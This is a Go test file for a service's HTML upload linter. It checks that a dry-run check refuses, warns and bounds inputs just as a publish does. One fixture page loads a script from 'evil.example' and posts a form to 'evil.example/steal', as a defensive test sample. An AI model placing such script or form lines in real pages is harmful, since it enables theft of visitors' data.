package artifactupload_test

import (
	"errors"
	"slices"
	"strings"
	"testing"

	"github.com/crewlet/crewlet/internal/artifacts"
	"github.com/crewlet/crewlet/internal/artifactupload"
	"github.com/crewlet/crewlet/internal/artifactupload/lint"
)

// refused is a page the linter refuses on two lines: a script from an origin
// off the allowlist, and a form posting to another origin.
const refused = `<!doctype html><html><head><meta name="viewport" content="width=device-width">
<script src="https://evil.example/x.js"></script>
</head><body>
<form action="https://evil.example/steal" method="post"><input name="q"></form>
</body></html>`

func checkFiles(files map[string]string) []artifactupload.CheckFile {
	var out []artifactupload.CheckFile
	for p, text := range files {
		out = append(out, artifactupload.CheckFile{Path: p, Text: []byte(text)})
	}
	slices.SortFunc(out, func(a, b artifactupload.CheckFile) int { return strings.Compare(a.Path, b.Path) })
	return out
}

func codes(fs []lint.Finding) []lint.Code {
	out := make([]lint.Code, len(fs))
	for i, f := range fs {
		out[i] = f.Code
	}
	return out
}

// A CHECK ANSWERS WHAT THE PUBLISH WOULD: the same refusals, every one with
// its file and line, from the same steps, so the two can never disagree about
// a page.
func TestACheckRefusesWhatThePublishRefuses(t *testing.T) {
	t.Parallel()
	h := newHarness(t, options{})
	c := h.person("ada", "")
	files := map[string]string{"index.html": refused}
	report, err := h.svc.Check(t.Context(), c, artifacts.KindHTML, "index.html", checkFiles(files))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	want := []lint.Code{lint.CodeRemoteScript, lint.CodeFormOffOrigin}
	if !slices.Equal(codes(report.Refusals), want) {
		t.Fatalf("the check refuses %v, want %v", codes(report.Refusals), want)
	}
	for _, f := range report.Refusals {
		if f.Path != "index.html" || f.Line < 2 {
			t.Errorf("a refusal names %s:%d, want a line of index.html", f.Path, f.Line)
		}
	}

	up := h.upload(h.person("ada", ""), artifacts.ID{}, files)
	_, _, err = h.svc.Create(t.Context(), h.person("ada", h.opKey("create")), artifactupload.CreateRequest{
		Kind: artifacts.KindHTML, Title: "A page", Owner: "ada", OwnerKind: c.Authority.Actor.Kind,
		Upload: up, Files: specs(files), Entry: "index.html",
	})
	var refusal *lint.Refusal
	if !errors.As(err, &refusal) {
		t.Fatalf("the publish answered %v, want the linter's refusal", err)
	}
	if !slices.Equal(refusal.Findings, report.Refusals) {
		t.Errorf("the publish refuses %v and the check %v; they must agree", refusal.Findings, report.Refusals)
	}
}

// A CHECK WRITES NOTHING AND FETCHES NOTHING: no reservation is held, no
// object is stored, and an allowlisted CDN file is named where its copy would
// be served without the CDN being asked for it.
func TestACheckWritesAndFetchesNothing(t *testing.T) {
	t.Parallel()
	h := newHarness(t, options{})
	report, err := h.svc.Check(t.Context(), h.person("ada", ""), artifacts.KindHTML, "index.html",
		checkFiles(map[string]string{"index.html": page, "app.css": "body { margin: 0 }"}))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(report.Refusals) != 0 {
		t.Errorf("a page the publish takes is refused by the check: %v", report.Refusals)
	}
	if report.Warnings == nil || report.Refusals == nil {
		t.Error("an empty list must be answered as an empty list, not as nothing")
	}
	if h.cdn.hits != 0 {
		t.Errorf("the check asked the CDN %d times, want none", h.cdn.hits)
	}
	if len(h.stored()) != 0 || h.held() != 0 {
		t.Errorf("the check stored %d objects and holds %d bytes, want none", len(h.stored()), h.held())
	}
}

// A CHECK WARNS AS THE PUBLISH WARNS: a page with no viewport, and a version
// that never follows its reader's appearance.
func TestACheckWarnsAsThePublishWarns(t *testing.T) {
	t.Parallel()
	h := newHarness(t, options{})
	bare := `<!doctype html><html><head><link rel="stylesheet" href="/_crewlet/kit/` + testKit +
		`/kit.css"></head><body><p>Hello</p></body></html>`
	report, err := h.svc.Check(t.Context(), h.person("ada", ""), artifacts.KindHTML, "index.html",
		checkFiles(map[string]string{"index.html": bare}))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	got := codes(report.Warnings)
	for _, want := range []lint.Code{lint.CodeNoViewport, lint.CodeNoDarkMode} {
		if !slices.Contains(got, want) {
			t.Errorf("the check warns %v, want %s among them", got, want)
		}
	}
}

// A CHECK IS REFUSED WHOLE where a publish would be: a kind whose files are no
// pages, a file that is not text, a path the grammar refuses, a file named
// twice, and more than the bounds.
func TestACheckIsRefusedOutsideItsBounds(t *testing.T) {
	t.Parallel()
	h := newHarness(t, options{})
	c := h.person("ada", "")
	many := make([]artifactupload.CheckFile, artifactupload.MaxCheckFiles+1)
	for i := range many {
		many[i] = artifactupload.CheckFile{Path: "p" + strings.Repeat("a", i) + ".css", Text: []byte("a{}")}
	}
	for name, tc := range map[string]struct {
		kind  artifacts.Kind
		files []artifactupload.CheckFile
		want  error
	}{
		"a native kind": {artifacts.KindDoc, checkFiles(map[string]string{"index.md": "# Hi"}),
			artifactupload.ErrInvalid},
		"a picture": {artifacts.KindHTML, checkFiles(map[string]string{"a.png": "\x89PNG"}),
			artifactupload.ErrInvalid},
		"a reserved path": {artifacts.KindHTML, checkFiles(map[string]string{"_crewlet/x.html": "<p>"}),
			artifactupload.ErrInvalid},
		"a file named twice": {artifacts.KindHTML, []artifactupload.CheckFile{
			{Path: "index.html", Text: []byte("<p>")}, {Path: "./index.html", Text: []byte("<p>")}},
			artifactupload.ErrInvalid},
		"no files":       {artifacts.KindHTML, nil, artifactupload.ErrInvalid},
		"too many files": {artifacts.KindHTML, many, artifactupload.ErrInvalid},
		"too much text": {artifacts.KindHTML, []artifactupload.CheckFile{{Path: "index.html",
			Text: []byte(strings.Repeat("a", artifactupload.MaxCheckBytes+1))}}, artifactupload.ErrInvalid},
	} {
		if _, err := h.svc.Check(t.Context(), c, tc.kind, "", tc.files); !errors.Is(err, tc.want) {
			t.Errorf("%s: the check answered %v, want %v", name, err, tc.want)
		}
	}
	if _, err := h.svc.Check(t.Context(), c, artifacts.KindHTML, "",
		[]artifactupload.CheckFile{{Path: "index.html", Text: []byte("\xff\xfe")}}); err == nil {
		t.Error("text that is not UTF-8 was checked, want it refused as a publish refuses it")
	}
}
